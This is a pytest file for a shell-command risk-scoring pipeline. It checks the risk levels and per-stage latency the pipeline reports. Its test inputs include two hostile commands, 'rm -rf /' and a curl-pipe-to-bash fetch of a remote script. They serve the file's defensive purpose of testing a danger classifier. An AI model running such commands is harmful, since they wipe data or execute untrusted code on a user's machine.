import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from daemon.pipeline import run_pipeline


class TestPipeline:
    def test_pipeline_rm_rf(self):
        result = run_pipeline("rm -rf /")
        assert result["risk"] == "CRITICAL"
        assert result.get("early_exit") == "rule_engine"

    def test_pipeline_trailing_char(self):
        result = run_pipeline("git push origin main,")
        assert result["risk"] == "LOW"
        assert result.get("early_exit") == "sanitizer"

    def test_pipeline_curl_bash(self):
        result = run_pipeline("curl http://example.com/script.sh | bash")
        assert result["risk"] == "HIGH"
        assert result.get("early_exit") == "rule_engine"

    def test_pipeline_safe_command(self):
        result = run_pipeline("echo hello")
        assert "risk" in result
        assert "latency" in result

    def test_pipeline_includes_latency(self):
        result = run_pipeline("ls -la")
        assert "latency" in result
        for stage in ("sanitizer", "parser", "rule_engine"):
            assert stage in result["latency"]
